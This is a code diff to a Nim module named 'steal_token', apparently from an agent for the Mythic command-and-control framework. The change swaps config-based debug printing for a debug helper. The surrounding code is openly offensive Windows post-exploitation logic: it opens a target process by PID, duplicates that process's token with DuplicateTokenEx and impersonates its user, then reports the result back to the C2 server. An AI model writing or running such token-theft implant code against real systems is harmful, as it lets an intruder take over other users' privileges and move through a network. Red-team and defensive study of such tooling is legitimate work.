@@ -1,8 +1,8 @@
 ## Steal Token - Steals a primary token from another process
 
 import std/[json, strformat, strutils]
-import ../config
 import ../utils/mythic_responses
+import ../utils/debug
 import token_manager
 
 when defined(windows):
@@ -10,8 +10,6 @@ when defined(windows):
   
   proc stealToken*(taskId: string, params: JsonNode): JsonNode =
     ## Steal a token from a target process
-    let cfg = getConfig()
-    
     try:
       # Parse PID from parameters
       # Mythic sends this as a JSON string "8772" which parses to a JString
@@ -22,8 +20,7 @@ when defined(windows):
       except:
         return mythicError(taskId, &"Invalid PID: {pidStr}")
       
-      if cfg.debug:
-        echo &"[DEBUG] steal_token: PID={pid}"
+      debug &"[DEBUG] steal_token: PID={pid}"
       
       # Open the target process
       let processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid.DWORD)
@@ -46,8 +43,7 @@ when defined(windows):
       const SecurityImpersonationLevel = 2.DWORD
       const TokenImpersonationType = 2.DWORD
       
-      if cfg.debug:
-        echo &"[DEBUG] About to duplicate token with SecurityLevel={SecurityImpersonationLevel}, TokenType={TokenImpersonationType}"
+      debug &"[DEBUG] About to duplicate token with SecurityLevel={SecurityImpersonationLevel}, TokenType={TokenImpersonationType}"
       
       if DuplicateTokenEx(processToken, MAXIMUM_ALLOWED, nil, SecurityImpersonationLevel, 
                           TokenImpersonationType, addr impersonationToken) == 0:
@@ -79,8 +75,7 @@ when defined(windows):
       # Get the new user context (after impersonation)
       let newUser = getCurrentUsername()
       
-      if cfg.debug:
-        echo &"[DEBUG] Successfully stole token from PID {pid}: {newUser}"
+      debug &"[DEBUG] Successfully stole token from PID {pid}: {newUser}"
       
       # Build response with callback data
       return mythicCallback(taskId, &"Successfully impersonated {newUser} from PID {pid}", %*{
